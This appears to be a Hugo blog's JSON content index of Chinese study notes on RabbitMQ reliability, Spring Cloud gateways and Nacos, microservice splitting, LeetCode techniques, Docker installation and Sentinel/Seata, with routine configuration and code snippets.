可读性差 解决：\n用 Jackson 序列转换器\n注意收发一致\n进阶 改进消息可靠性问题\n发送者可靠性 重连 由于网络波动，可能出现发送者连接 MQ 失败。\n配置中开启重连机制即可\n注意性能损耗 使用合理的重连机制 确认 MQ 接收到消息后，返回 ACK 给发送者。（对性能影响较大）\n不同的返回情况、强度 其他情况返回 NACK，告知投递失败 使用：\n先开启配置 public confirm type\n配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Slf4j @AllArgsConstructor @Configuration public class MqConfig { private final RabbitTemplate rabbitTemplate; @PostConstruct //只在启动时初始化依次 public void init(){ rabbitTemplate.setReturnsCallback(new RabbitTemplate.ReturnsCallback() { @Override public void returnedMessage(ReturnedMessage returned) { log.error(\u0026#34;触发return callback,\u0026#34;); log.debug(\u0026#34;exchange: {}\u0026#34;, returned.getExchange()); log.debug(\u0026#34;routingKey: {}\u0026#34;, returned.getRoutingKey()); log.debug(\u0026#34;message: {}\u0026#34;, returned.getMessage()); log.debug(\u0026#34;replyCode: {}\u0026#34;, returned.getReplyCode()); log.debug(\u0026#34;replyText: {}\u0026#34;, returned.getReplyText()); } }); } } 发送方： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Test void testPublisherConfirm() throws InterruptedException { // 1.创建CorrelationData CorrelationData cd = new CorrelationData(); // 2.给Future添加ConfirmCallback cd.getFuture().addCallback(new ListenableFutureCallback\u0026lt;CorrelationData.Confirm\u0026gt;() { @Override public void onFailure(Throwable ex) { // 2.1.Future发生异常时的处理逻辑，基本不会触发 log.error(\u0026#34;handle message ack fail\u0026#34;, ex); } @Override public void onSuccess(CorrelationData.Confirm result) { // 2.2.Future接收到回执的处理逻辑，参数中的result就是回执内容 if(result.isAck()){ // result.isAck()是boolean类型，true代表ack回执，false代表nack回执 log.debug(\u0026#34;发送消息成功，收到 ack!\u0026#34;); }else{ // result.getReason()是String类型，返回nack时的异常描述 log.error(\u0026#34;发送消息失败，收到 nack，reason：{}\u0026#34;, result.getReason()); } } }); // 3.发送消息 rabbitTemplate.convertAndSend(\u0026#34;hmall.direct\u0026#34;, \u0026#34;red1\u0026#34;, \u0026#34;hello\u0026#34;, cd); } 若发送失败，则尝试重发\nMQ可靠性 问题：\n数据丢失\n内存空间有限，可能导致消息阻塞、堆积\n数据持久化 交换机、队列、消息\n消息：内存到上限后，才写出到磁盘，阻塞 一直写出到磁盘 Lazy Queue 惰性队列\n接到消息不再写到内存，直接存入磁盘 消费消息时，从磁盘中读取并加载到内存 消费者可靠性 确认 消费者处理消息结束后，向 MQ 发送回执，告知消息处理状态\nack：成功处理 配置`acknowledge-mode none 接到后直接返回。不安全 manual 手动编写返回逻辑 auto nack：处理失败，需要重发 reject：处理失败并拒绝，MQ 从队列中删除该消息 失败重试 问题：消费者反复调用 MQ 导致性能损耗\n解决：消费者出现异常时利用本地调试机制，无需调用 queue\n重试耗尽后的策略\n直接 reject（默认） 返回 nack，重新入队 将失败消息投递到指定的交换机 业务幂等 程序开发时，同一个业务执行一次和多次对业务状态的影响是一致的。用于确保消息不被多次执行。\n解决方案：\n给每个消息设置唯一 id ，配置SetMessageId，然后将 id 写入数据库\n业务判断：基于业务本身\n保证服务间一致性 延迟消息 实现一致性的兜底方案。\n发送者发送消息时指定时间，消费者在指定时间后才收到消息\n如支付超时取消 死信交换机 死信：\nrequeue = false 消息无人消费、过期 \u0026ndash;\u0026gt; 用于实现延迟消息 消息堆积满了，最早的消息成为死信 死信交换机：\n接收死信 消息延迟插件 RabbitMQ的插件，docker部署\n计时需要占用 CPU，产生资源消耗 尽可能延时缩短 ","date":"2025-10-02T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-mq/","title":"MQ"},{"content":"网关 介绍 网络的关口，负责请求的路由、转发、身份检验。分为阻塞式、响应式。微服务将服务注册到注册中心，网关进行服务拉取返回给前端。\n使用 创建新模块 引入网关依赖 编写启动类 配置路由 1 2 3 4 5 6 7 8 9 10 11 12 spring: cloud: gateway: routes: - id: item # 路由规则id，自定义，唯一 uri: lb://item-service # 路由目标微服务，lb代表负载均衡 predicates: # 路由断言，判断请求是否符合规则，符合则路由到目标 - Path=/items/** # 以请求路径做判断，以/items开头则符合 - id: xx uri: lb://xx-service predicates: - Path=/xx/** 另有各种路由种类、路由过滤器。\n登录校验 需要在网关转发之前进行校验，即添加过滤器。\n网关底层流程：\nHandlerMapping 路由映射器 WebHandler 请求处理器，即过滤器处理器 PRE（在这里实现） + POST 阶段 Q: 网关如何将用户信息传递给微服务？\nHttp 传送 \u0026ndash;\u0026gt; 用请求头 Q: 微服务之间如何传递用户信息？\n自定义过滤器 GatewayFilter：指定路由生效 GlobalFilter：全局过滤器，作用于所有路由 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Component public class MyGlobalFilter implements GlobalFilter, Ordered { @Override public Mono\u0026lt;Void\u0026gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { // 1.获取请求 ServerHttpRequest request = exchange.getRequest(); // 2.过滤器业务处理 System.out.println(\u0026#34;GlobalFilter pre阶段 执行了。\u0026#34;); // 3.放行 return chain.filter(exchange); } @Override public int getOrder() { // 过滤器执行顺序，值越小，优先级越高 return 0; } } 网关拦截逻辑： 获取 request\n根据 URL 判断是否需要拦截\n获取 Token，解析校验\n网关传递服务 用 ServerWebExchange 类下的 API 来给请求头添加鉴权信息，再发送给后续服务。\n将登录检验封装为工具模块（配置类），统一扫描调用。\n配置类的配置：@ConditionalOnClass(DispatcherServlet.class) 只拦截到后端 SpringMVC 的请求（否则其他模块扫描不到），绕过网关。\n微服务间传递信息 利用 OpenFeign 的 RequestTemplate 类更改请求头传递，保存请求头。\n配置管理中心 问题：\n微服务重复配置过多，维护成本高 更改配置不方便，需要重启服务、网关 解决：\n通过配置管理实现热更新、配置共享 配置管理 NACOS 可视化编辑共享配置 包含：\n数据库\n日志\nSwagger\n……\n微服务拉取共享配置 流程：\n启动，加载 bootstrap 引导类 拉取 Nacos 配置 初始化 ApplicationContext上下文 加载 application.yml ，拉取共享配置，合并配置 配置热更新 前提条件\nnacos 中要有于微服务名有关的配置文件 微服务中要以特定方式读取需要热更新的配置属性 动态路由 要求：\n监听 Nacos 配置变更信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 private final NacosConfigManager nacosConfigManager; public void initRouteConfigListener() throws NacosException { // 1.注册监听器并首次拉取配置 String configInfo = nacosConfigManager.getConfigService() .getConfigAndSignListener(dataId, group, 5000, new Listener() { @Override public Executor getExecutor() { return null; } @Override public void receiveConfigInfo(String configInfo) { // TODO 监听到配置变更，更新一次配置 } }); // TODO 2.首次启动时，更新一次配置 } 再定义 UpdateConfigInfo(),删除旧的路由、重新读取新路由 ","date":"2025-10-01T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E7%BD%91%E5%85%B3%E5%8F%8A%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/","title":"网关及配置中心"},{"content":"为什么需要拆分？ 单体架构不适合于用户量大、开发人员多的项目 访问资源难以分配，无法分解并发压力 \u0026ndash;\u0026gt; 把单体架构拆分为多个独立项目\n颗粒度小，团队自治，服务自治，数据隔离\n服务拆分 前置知识 首先熟悉项目、模块，看流程。\n拆分时机\n创业型项目先采用单体结构，随规模扩增\n拆分原则\n高内聚（关联度、完整度高），低耦合（减少对其他服务依赖）\n纵向：按业务模块\n横向：抽取公共服务，提高复用性\n拆分类型\n独立 project：适用于大型项目\nMaven 聚合，分开打包：较小型项目\n注册中心\n整合服务调用、服务提供者\n提供负载均衡，心跳续约、推送变更（防失效）\nNacos\n需要提供数据库，配置服务注册\n服务发现 -\u0026gt; 挑选示例（负载均衡） -\u0026gt; 调用\nOpenFeign\n声明式http客户端，简化http请求书写\n使用步骤：导入 client 模块 -\u0026gt; 打开开关 -\u0026gt; 写接口\n接口的作用是转发 http 请求，作为各个服务间请求数据的中介\n连接池：底层请求用的是 Client，效率较低，用连接池优化\n最佳实践：1. 将查询接口放到服务提供方 2 . 封装为统一的api模块（耦合度较高）\n日志记录：定义类、定义日志级别，声明到注解\n拆分步骤 先按模块分析，将实体类区分开 选择拆分类型，建立模块或项目，改依赖 导入并修改启动类、配置类、各种实体类，根据报错再修改 导入service、impl、controller、mapper 重建数据库、配置启动项进行测试 注意\n若 service 中还需要注入其他模块的 service，就要配置注册中心。接入 feign 的 api 接口来调用指定服务。在拆分的同时不断完善 feign 的接口（从目标服务的 controller 中抽取）。\n","date":"2025-10-01T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86/","title":"微服务拆分"},{"content":"哈希 适用场景：\ncollections.defaultdict(type) 字典类型，自动添加某类型元素。思考哈希值如何计算、如何存储。 涉及到查重、判断是否存在相似元素时，可以使用。 例题 字母异位词分组 1 2 3 4 5 1. collections.defaultdict(list) 满足返回的为各个字符集;通过 mp[key].append(st) 来给字典加入值。 2. \u0026#34;\u0026#34;.join(sorted(s)) 来排序、求重 3. return list(mp.values()) 直接返回值的列表 最长连续序列 1 2 3 1. 利用集合去重、提高查找速度 2. 分析连续序列所满足的条件、限制的条件：若n-1在序列中，则无需遍历n，利用包含关系来简化算法 双指针 适用场景：\n多变量问题，变量间存在某种关系 首尾比较、字符移动 同向、相向遍历问题 通法：\n初始化左右指针，并考虑其作用、意义 写循环，考虑边界条件、指针变化规律，注意规范 例题 移动0 1 2 3 1. 由于要将0移到末端，所以右指针需要指向非零数，左指针指向0，两数交换即可 2. 边界条件：右指针到末尾即停止，因为已经没有非零数需要向前移动 盛最多水的容器 1 2 3 4 5 6 1. 暴力思路：直接两层for循环从左向右遍历 2. 思考：有必要依次循环吗？什么情况下会出现最大值？如何趋向最大值？ 3. 优化：计算面积的公式是：(right - left)*min(height[left],height[right]) 那么不妨从 right - left 最大时开始遍历，这时想到双指针。那么往里收缩的条件就变成比较height的大小。如果height更大就直接保留，舍去了很多不必要的情况。 三数之和 1 2 3 4 5 1. 难点在于去重，各个值的组合不能重复 2. 思考：\u0026#34;不能重复\u0026#34;这一要求能不能转化？ 3. 优化：不妨将数组重新排序，从而让三个数也排序地输出，免去了去重的麻烦。更进一步，a+b+c=0是等式关系，而a确定后，b是递增的，c又是由a、b决定的，故可以将b、c用双指针遍历，一增一减，完全符合要求。 滑动窗口 适用情景：\n连续子数组、子序列 在一个范围内进行条件统计 具有单调性，随窗口移动时不必全部更新 要点在于，将问题放到窗口中讨论，控制窗口来控制遍历所有可能情况 模板：\n右入（直到装满窗口） - 判断 - 更新 - 左出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ans = vowel = 0 for i, c in enumerate(s): # 枚举窗口右端点 i # 1. 右端点进入窗口 if c in \u0026#34;aeiou\u0026#34;: vowel += 1 left = i - k + 1 # 窗口左端点 if left \u0026lt; 0: # 窗口大小不足 k，尚未形成第一个窗口 continue # 2. 更新答案 ans = max(ans, vowel) if ans == k: # 答案已经等于理论最大值 break # 无需再循环 # 3. 左端点离开窗口，为下一个循环做准备 if s[left] in \u0026#34;aeiou\u0026#34;: vowel -= 1 return ans 定长 无重复字符的最长字串 1 2 3 4 5 6 7 1. 先模拟，右指针移动到发现重复字符时为边界 2. 边界处理：发现移动左指针时，无需将右指针移动回来（单调性），移动左指针即可 3. 注意：边界要分清楚！！right - left 的相对关系不能错 4. Counter(str) 方法，统计各个字符出现的次数 几乎唯一子数组的最大和 如果 nums 的一个子数组有至少 m 个互不相同的元素，我们称它是 几乎唯一 子数组。\n1 2 3 4 5 6 7 1. 区间求和，考虑用滑动窗口 2. 有两个变量 m,k 分别维护即可。用一个字典来标记是否有重复！ 3. 注意：当 defaultdict(int) 为空时，需要将元素删去！否则统计长度时会出错。 if cnt[out] == 0: del cnt[out] 不定长 + 越长越合法 每个字符最多出现两次 给你一个字符串 s ，请找出满足每个字符最多出现两次的最长子字符串，并返回该子字符串的 最大 长度。\n1 2 3 1. 区间判断，仍然是滑动窗口，不同之处在于变成了不定长滑窗 2. 不定长的判断逻辑修改一下即可 使数组平衡的最少移出数目 给你一个整数数组 nums 和一个整数 k。\n如果一个数组的 最大 元素的值 至多 是其 最小 元素的 k 倍，则该数组被称为是 平衡 的。\n你可以从 nums 中移除 任意 数量的元素，但不能使其变为 空 数组。\n返回为了使剩余数组平衡，需要移除的元素的 最小 数量。\n1 1. 能看出是滑动窗口吗？问题转化为：求一个窗口，使得其最小元素最小值*k \u0026gt;= 最大值！ 不定长 + 越短越合法 最短美丽字串 给二进制字符串s和正整数k，找到满足以下条件的子字符串：\n子字符串中1的个数恰好是k（即美丽子字符串）； 该子字符串是所有美丽子字符串中最短的； 若有多个最短的，选字典序最小的；若没有美丽子字符串，返回空字符串。 1 2 3 4 5 1. 如何保证最短？ --\u0026gt; 最前端如果有 0，需要继续向后 2. 当达到筛选条件后，需要进一步收缩边界！ 3. 字符串字典序直接比较即可 求子数组个数 + 越短越合法 元素乘积小于 k 的子数组数目 给你一个整数数组 nums 和一个整数 k ，请你返回子数组内所有元素的乘积严格小于 k 的连续子数组的数目。\n1 2 3 1. 要求连续子数组，发现缩短以后一样符合条件，所以是滑窗的变式 2. 小于当前窗口的都符合，所以要 res += right - left + 1 不间断子数组数目 给你一个下标从 0 开始的整数数组 nums 。nums 的一个子数组如果满足以下条件，那么它是 不间断 的：\ni，i + 1 ，\u0026hellip;，j 表示子数组中的下标。对于所有满足 i \u0026lt;= i1, i2 \u0026lt;= j 的下标对，都有 0 \u0026lt;= |nums[i1] - nums[i2]| \u0026lt;= 2 。 请你返回 不间断 子数组的总数目。\n子数组是一个数组中一段连续 非空 的元素序列。\n1 2 3 1. 用哈希表维护的判断条件！ 2. 还是滑窗的思路，依次控制窗口枚举 求子数组个数 + 越长越合法 包含所有三种字符的子字符串数目 给你一个字符串 s ，它只包含三种字符 a, b 和 c 。\n请你返回 a，b 和 c 都 至少 出现过一次的子字符串数目。\n1 2 3 4 5 1. 先找至少出现过一次的情况，想到滑动窗口 2. “至少”意味着只能找最短，所以在更新时要将更长的字符串加上，即 res += left 3. 注意：不能写 if len(cnt) \u0026lt; 3: continue 的判断，边界条件要考虑清楚！ 恰好型滑窗 要计算有多少个元素和恰好等于 k 的子数组，可以把问题变成：\n计算有多少个元素和 ≥k 的子数组。 计算有多少个元素和 \u0026gt;k，也就是 ≥k+1 的子数组。 因为滑动窗口比较难解决“等于”问题，故尝试转化成不等于问题，即越\u0026hellip;越合法\n答案就是元素和 ≥k 的子数组个数，减去元素和 ≥k+1 的子数组个数。\n也可以把问题变成 ≤k 减去 ≤k−1，即两个「至多」。可根据题目选择合适的变形方式。 和相同的二元子数组 给你一个二元数组 nums ，和一个整数 goal ，请你统计并返回有多少个和为 goal 的 非空 子数组。\n子数组 是数组的一段连续部分。\n1 2 3 1. 求区间和，可以用前缀和，但是这里考虑滑窗 2. 转为求 res1 - res2，需要用两个 left1，2、sum1，2 来分别求边界 前缀和 适用情景：\n连续子数组求和问题，数组不单调时，考虑用前缀和 任意子数组都是一个前缀去掉前缀后的结果。所以任意子数组的和，都可以表示为两个前缀和的差。 定义 s[0] = 0 ，提高适用性 初始化模板：\n1 2 3 s = [0] * (len(nums) + 1) for i, x in enumerate(nums): s[i + 1] = s[i] + x 例题 和为 K 的子数组 1 2 3 4 5 6 7 1. 连续数组求和，考虑前缀和 2. 继续分析，发现要求 s[i] + s[j] == k，暴力写法要 O(n^2)，考虑转换 3. 想到哈希表，空间换时间，遍历一遍后存储到表中，可以直接查询 s[j] - k 4. 注意：哈希表的遍历顺序和数组顺序要对应！先寻找，再加入哈希表，不能一次性往里添加 最大子数组和 1 2 3 4 5 1. 考虑前缀和 2. 发现边缘条件：需要考虑负数！前缀和求的是区间加法，所以要用当前前缀减去前面的最小前缀（需要维护） 3. 还可以用动态规划 二分 适用场景：\n有序数组找指定大小的数 思路：\n先确定区间（循环不变量），根据区间来初始化左右指针\n明确：左右指针以外是已经确定了大小关系的，接下来要更新的是左右指针以内的数\n转化\n基本做法只能做 \u0026gt;= x\n遇见 \u0026gt;x，转成 \u0026gt;= x+1，\u0026lt;x 转成 \u0026lt;= x-1 等等\n易错点\n要保证区间 - 条件判断的连贯性，判断条件只要符合区间，就合法，就需要查找 建议画图来理解！ 可以定义函数来复用逻辑 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def binary_search(nums, target): left = 0 right = len(nums) - 1 # 闭区间初始化 while left \u0026lt;= right: # 区间非空时循环 mid = (left + right) // 2 # 避免溢出可用 left + (right - left) // 2 if nums[mid] == target: return mid # 找到目标，返回索引 elif nums[mid] \u0026gt; target: right = mid - 1 # 目标在左半区间，收缩右边界 else: left = mid + 1 # 目标在右半区间，收缩左边界 return -1 # 区间为空，未找到 def find_first_ge(nums, target): left = 0 right = len(nums) - 1 res = len(nums) # 默认值（若所有元素都小于target，返回数组长度） while left \u0026lt;= right: mid = (left + right) // 2 if nums[mid] \u0026gt;= target: res = mid # 可能是候选答案，继续向左找更小的符合条件的位置 right = mid - 1 else: left = mid + 1 # 不符合，向右找 return res 二分查找 查找元素首尾位置 1 2 3 4 5 1. 边界的判断注意，函数 find 的是什么？结果要什么？ 2. 找到坐标后，如何排除不可能的答案？--\u0026gt; 直接用左右边界判断即可。 3. 还写错了 while 的更新条件，nums[mid] 而非 mid 搜索插入位置 1 1. 先想清楚要找什么！找第一个大于等于指定数的位置即可！ 寻找比目标字母大的最小字母 1 2 3 1. 写习惯了大于等于，怎么变成大于？ --\u0026gt; 改变循环不变量就可以！控制 left 左边为 \u0026lt;= 的就行 2. py 里求 askii 码：ord(char) 两个数组的距离值 给你两个整数数组 arr1 ， arr2 和一个整数 d ，请你返回两个数组之间的 距离值 。\n「距离值」 定义为符合此距离要求的元素数目：对于元素 arr1[i] ，不存在任何元素 arr2[j] 满足 |arr1[i]-arr2[j]| \u0026lt;= d 。\n1 2 3 4 5 1. 怎么找满足距离值的数？ --\u0026gt; 距离先变小后变大 --\u0026gt; 二分 2. 找什么数？ --\u0026gt; 大于等于 target 的第一个数和第一个数的前一个数，这两个数才有可能 3. 优化：二分查找 ≥x−d 的最小的数 y。如果 y 不存在，或者 y\u0026gt;x+d，那么说明 arr 没有在 [x−d,x+d] 中的数，答案加一。 区间内查询数字的频率 请你实现 RangeFreqQuery 类：\nRangeFreqQuery(int[] arr) 用下标从 0 开始的整数数组 arr 构造一个类的实例。 int query(int left, int right, int value) 返回子数组 arr[left...right] 中 value 的 频率 。 1 2 3 1. 暴力会超时……考虑优化 2. 找数字在区间内出现的频率，把问题化约到每个数字，先记录每个数字出现的下标表，然后二分查找在所求区间内，数字的数量。 二分答案 定义：一种通过 “二分枚举可能的答案范围” 来求解优化问题（如最大值最小化、最小值最大化）的算法。 核心目标：在所有可能的答案中，找到满足题目约束条件的最优解（如最大、最小、符合条件的解）。 本质：“构造答案并验证”，将优化问题转化为 “判断某个值是否为可行解” 的判定问题，再通过二分缩小范围。 简而言之，就是不确定上下界，需要自己放缩出边界，然后进行二分查找。可能需要自己编写 check 函数来判断\n模板：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution: # 计算满足 check(x) == True 的最小整数 x def binarySearchMin(self, nums: List[int]) -\u0026gt; int: # 二分猜答案：判断 mid 是否满足题目要求 def check(mid: int) -\u0026gt; bool: # TODO left = # 循环不变量：check(left) 恒为 False right = # 循环不变量：check(right) 恒为 True while left + 1 \u0026lt; right: # 开区间不为空 mid = (left + right) // 2 if check(mid): # 说明 check(\u0026gt;= mid 的数) 均为 True right = mid # 接下来在 (left, mid) 中二分答案 else: # 说明 check(\u0026lt;= mid 的数) 均为 False left = mid # 接下来在 (mid, right) 中二分答案 # 循环结束后 left+1 = right # 此时 check(left) == False 而 check(left+1) == check(right) == True # 所以 right 就是最小的满足 check 的值 return right 使结果不超过阈值的最小除数 给你一个整数数组 nums 和一个正整数 threshold ，你需要选择一个正整数作为除数，然后将数组里每个数都除以它，并对除法结果求和。\n请你找出能够使上述结果小于等于阈值 threshold 的除数中 最小 的那个。\n每个数除以除数后都向上取整，比方说 7/3 = 3 ， 10/2 = 5 。\n题目保证一定有解。\n1 2 3 4 5 1. 找值，考虑二分 2. 先确定上下边界，可以取 1,max(nums),然后自定义 check 函数判断。 3. python 的向上取整函数 math.ceil() 在 D 天内送达包裹的能力 传送带上的包裹必须在 days 天内从一个港口运送到另一个港口。\n传送带上的第 i 个包裹的重量为 weights[i]。每一天，我们都会按给出重量（weights）的顺序往传送带上装载包裹。我们装载的重量不会超过船的最大运载重量。\n返回能在 days 天内将传送带上的所有包裹送达的船的最低运载能力。\n1 2 3 4 5 6 7 8 9 10 11 12 13 1. 难点在 check 函数的编写！怎么判断是否可以？ 2. 其实很简单，注意初始 cnt = 1，每天的货物运输需要模拟过程才不会错！ def helper(load): days = 1 # 最少也得花一天 s = 0 for x in weights: s += x if s \u0026gt; load: days += 1 s = x # 当前包开始新一天 return days ","date":"2025-09-30T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251017094519413.png","permalink":"https://calendar0917.github.io/posts/leetcode/","title":"LeetCode Hot100"},{"content":"CentOS7 查看是否已安装 1 docker --version 若已安装：\n1 2 3 4 5 6 7 8 9 10 11 yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine \\ docker-ce 安装依赖工具 yum 1 sudo yum install -y yum-utils device-mapper-persistent-data lvm2 错误：yum-config-manager：找不到命令\nyum -y install yum-utils\n错误：更新 yum 报错\nsudo tee /etc/yum.repos.d/CentOS-Base.repo \u0026laquo;-\u0026lsquo;EOF\u0026rsquo; [base] name=CentOS-$releasever - Base baseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n[updates] name=CentOS-$releasever - Updates baseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n[extras] name=CentOS-$releasever - Extras baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\nEOF\n安装docker 添加 docker 官方仓库\n1 2 3 4 sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo # 阿里云： sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 安装\n1 sudo yum install -y docker-ce docker-ce-cli containerd.io 启动、设置开机自启\n1 2 sudo systemctl start docker sudo systemctl enable docker docker 拉取镜像源配置 添加多个镜像源\n1 2 3 4 5 6 7 8 9 10 11 12 sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://alzgoonw.mirror.aliyuncs.com\u0026#34;, \u0026#34;https://docker.m.daocloud.io\u0026#34;, \u0026#34;https://dockerhub.icu\u0026#34;, \u0026#34;https://docker.anyhub.us.kg\u0026#34;, \u0026#34;https://docker.1panel.live\u0026#34; ] } EOF 重新加载并重启\n1 2 sudo systemctl daemon-reload sudo systemctl restart docker 测试\n1 docker pull hello-world Ubuntu 删除无效的密钥文件 1 rm -f /etc/apt/trusted.gpg.d/docker.gpg 更换方式获取 Docker GPG 密钥 1 curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/trusted.gpg.d/docker.gpg 替换 Docker 源为国内镜像 1 2 3 4 # 删除原有Docker源 rm -f /etc/apt/sources.list.d/docker.list # 添加阿里云Docker源 echo \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/trusted.gpg.d/docker.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable\u0026#34; | tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null 更新源并安装 Docker 1 apt update \u0026amp;\u0026amp; apt install -y docker-ce docker-ce-cli containerd.io docker 配置 1 2 sudo systemctl start docker sudo systemctl enable docker 添加多个[镜像源](国内可用 Docker 镜像源 - 长期维护更新 | 解决 Docker Hub 拉取慢/失败 - 土薯在线工具)\n1 2 3 4 5 6 7 8 9 10 11 12 sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://alzgoonw.mirror.aliyuncs.com\u0026#34;, \u0026#34;https://docker.m.daocloud.io\u0026#34;, \u0026#34;https://dockerhub.icu\u0026#34;, \u0026#34;https://docker.anyhub.us.kg\u0026#34;, \u0026#34;https://docker.1panel.live\u0026#34; ] } EOF 重新加载并重启\n1 2 sudo systemctl daemon-reload sudo systemctl restart docker 测试\n1 docker pull hello-world 配置 clash 克隆安装脚本\n1 2 3 git clone --branch master --depth 1 https://github.com/nelvko/clash-for-linux-install.git \\ \u0026amp;\u0026amp; cd clash-for-linux-install \\ \u0026amp;\u0026amp; sudo bash install.sh 检查安装状态\n1 clashctl status 获取 Web 控制台地址\n1 clashctl ui 其他\nTun模式：clashctl tun on\ndocker 的代理需要额外配置\nLXC 中使用 docker 参考：SOLVED - Docker inside LXC (net.ipv4.ip_unprivileged_port_start error) | Proxmox Support Forum\n可能在启动时会有问题，要找指定版本！\n版本选择依据\n避开有 bug 的版本：论坛明确 1.7.28-2 及更高版本（如 1.7.29-1、2.1.5-1）会触发 LXC 中 Docker 修改 net.ipv4.ip_unprivileged_port_start 的权限错误，必须选择低于 1.7.28-2 的版本。 选择最接近的稳定版本：1.7.28-1~ubuntu.24.04~noble 是 1.7.28-2 的前一个版本，仅差小版本修复，功能完整且无该兼容性 bug，比更旧的 1.7.27-1/1.7.26-1 更推荐（减少版本回退带来的其他兼容性问题）。 ","date":"2025-09-29T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E6%8A%80%E6%9C%AF%E6%9D%82%E9%A1%B9-%E9%85%8D%E7%BD%AEdocker/","title":"配置docker"},{"content":"微服务保护 问题：\n雪崩问题：某个服务故障，导致整个链路失效 微服务相互调用 没有做好异常处理 所有服务级联失败 解决思路：\n尽量避免服务故障、阻塞\n做好异常的后备方案\n方案：\n请求限流 线程隔离：控制业务可用线程数量 服务熔断：将异常比例过高的接口断开，直接走 fallback 失败处理：定义 fallback 处理逻辑 Sentinel 整合到微服务中，配置控制台\n簇点链路：默认情况下，Sentinel 拦截的只是 Controller 的请求路径，故需要配置其拦截请求方法。\n请求限流 设置 QPS，每秒最多请求线程数\nJmeter\n请求模拟工具，用于测试压力\n线程隔离 服务 B 出现阻塞或故障时，调用服务 B 的服务 A 的资源也可能因此被耗尽，故必须限制服务 A 中调用服务B的线程数。保护服务 A 中其他接口。\nFallback 将 FeignClient 添加到服务，若超限，则调用其中的 FallFactory 的接口。\n服务熔断 解决雪崩问题的重要手段。有断路器统计服务调用的异常比例、慢请求比例，若超出阈值则熔断改服务。\n分布式事务 分布式系统中，一个业务需要多个服务共同完成，则这多个服务需要同时成功或失败。\n解决思路：\n各个子事务之间能感知到彼此的状态 Seata Seata架构 TC：事务协调者，协调全局事务提交或回滚\nTM：事务管理器，定义全局事务的范围，开始提交或回滚（入口）\nRM：资源管理器，与 TC 交谈以注册事务状态\n部署 TC 服务 seata 用 docker 部署，然后注册到 Nacos 上\n微服务集成 Seata 在 application.yml 中添加配置，让微服务找到 TC 地址\n抽取共享配置到 nacos、划分事务组\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 seata: registry: # TC服务注册中心的配置，微服务根据这些信息去注册中心获取tc服务地址 type: nacos # 注册中心类型 nacos nacos: server-addr: 192.168.150.101:8848 # nacos地址 namespace: \u0026#34;\u0026#34; # namespace，默认为空 group: DEFAULT_GROUP # 分组，默认是DEFAULT_GROUP application: seata-server # seata服务名称 username: nacos password: nacos tx-service-group: hmall # 事务组名称 service: vgroup-mapping: # 事务组与tc集群的映射关系 hmall: \u0026#34;default\u0026#34; XA 模式 步骤：\nRM 注册分支事务到 TC RM 执行 sql 但不提交 RM 报告执行状态到 TC TC 检查各分支执行状态，RM 等待 TC 指令 问题：\n需要锁定数据库资源，需要等待，性能较差 AT 模式 弥补 XA 模式中资源锁定周期过长的缺陷\n步骤：\n注册分支事务 记录数据快照 执行 sql 并提交 报告事务状态 删除快照 / 根据快照恢复数据 问题：\n短暂的数据不一致 使用：\n对每个服务创建一个 undo_log 表 ","date":"2025-09-08T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/","title":"微服务保护及分布式事务"}]